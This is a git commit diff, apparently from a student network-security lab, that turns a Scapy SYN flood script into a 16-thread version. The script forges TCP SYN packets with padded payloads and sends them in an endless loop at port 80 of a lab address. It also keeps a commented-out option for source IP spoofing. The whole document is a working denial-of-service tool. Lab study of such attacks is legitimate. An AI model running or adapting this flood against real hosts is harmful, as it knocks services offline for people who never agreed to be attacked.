b0f942935d50e520bfd8a37df0a50303eb42e5c3
bayoub03 <56605695+bayoub03@users.noreply.github.com>
2023-05-02 21:03:35 +0200

    adding threads to syn flood attack

--- attacks/syn_flood_ddos/main.py
+++ attacks/syn_flood_ddos/main.py
@@ -1,25 +1,36 @@
-"""
-Luyckx Marco 496283
-Bouhnine Ayoub 500048
-
-SYN FLooding
-"""
-
 from scapy.all import *
+
+import concurrent.futures
+import sys
+import time
+
+def syn_flood(target_ip, target_port):
+    # forge IP packet with target ip as the destination IP address
+    ip = IP(dst=target_ip)
+    # ip = IP(src=RandIP("10.2.0.1/24"), dst=target_ip) # with random IPs (spoofing)
+
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
+
+    raw = Raw(b"A"*1024) # adding some data
+
+    # forge the packet
+    packet = ip / tcp / raw
+
+    send(packet, loop=1, verbose=0) # resend the packet several time
 
 target_ip = "10.12.0.10"
 target_port = 80 # target port that will be flooded
 
-# forge IP packet with target ip as the destination IP address
-ip = IP(dst=target_ip)
-# ip = IP(src=RandIP("10.2.0.1/24"), dst=target_ip) # with random IPs (spoofing)
+start_time = time.time()
 
-tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
+with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
+    futures = []
+    for i in range(16):
+        futures.append(executor.submit(
+            syn_flood, target_ip, target_port))
 
-raw = Raw(b"A"*1024)
-
-# forge the packet
-packet = ip / tcp / raw
-
-send(packet, loop=1, verbose=0) # resend the packet several time
-
+    for future in concurrent.futures.as_completed(futures):
+        if future.result():
+            executor.shutdown(wait=False)
+            print('Time taken :', time.time() - start_time)
+            sys.exit(0)
